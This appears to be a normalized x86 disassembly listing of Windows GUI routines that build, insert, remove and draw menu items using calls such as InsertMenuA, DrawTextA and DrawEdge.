call sub_44a960
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_414240
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4198a0
test bl bl
jle r-xdata
call sub_403104
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_44a5f8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44a853
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a85a
lea eax [ ebp - 0x40 ]
call sub_403e54
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403eec
mov eax ebx
call sub_44c574
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_44ab08
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404260
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_44c574
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_44cb30
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_449c5c
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4041d4
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404314
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404314
push eax
mov eax ebx
call sub_44ab08
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44c14c
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404260
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404314
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_44c574
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_44ab08
mov [ ebp - 0x25 ] eax
sub_44a873
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44a5f8
xor eax eax
pop ebp
retn
sub_44a898
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44e16c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44d134
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44d630
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44a034
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44a908
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44a952
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418984
mov eax [ ebp - 0x4 ]
call sub_449ebc
mov edx eax
mov eax ebx
call sub_44c5a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a959
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_44a960
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44a9d8
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_419924
sub_44a99c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419ca4
mov eax ebx
call sub_44c55c
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_44c55c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403300
pop esi
pop ebx
retn
mov eax ebx
call sub_44a9d8
sub_44a9d8
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_44ab08
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44a9d8
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_44ab08
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_44ab08
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44a898
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebp
call sub_44ab08
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44aaa8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_44c574
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_44c584
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_44c584
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_44c584
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_449bb0
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_44ab08
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44a898
mov eax [ rw-data ]
call sub_449bb0
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44ab54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419bcc
push ebx
push sub_44a908
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_44ab98
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44ad7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44cb30
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403eec
test bh 0x4
je r-xdata
mov eax edi
call sub_44e16c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404260
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d510
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40411c
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41cee8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41cef4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ad83
lea eax [ ebp - 0xc ]
call sub_403e54
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41db3c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404114
push eax
mov eax [ ebp - 0xc ]
call sub_404314
push eax
mov eax [ ebp - 0x4 ]
call sub_41db3c
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41cc28
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404114
push eax
mov eax [ ebp - 0xc ]
call sub_404314
push eax
mov eax [ ebp - 0x4 ]
call sub_41db3c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41cc28
mov eax 0xff00000d
call sub_41c768
mov esi eax
mov eax 0xff000010
call sub_41c768
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41cc28
jmp r-xdata
sub_44ade8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44b6d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d3f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41cc28
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404260
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d3f4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447984
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db3c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d3ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d3f4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44b22f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_422e04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41cc28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447984
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d3f4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d3ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_423ea8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d3c8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d798
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d91c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_447e9c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d3f4
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
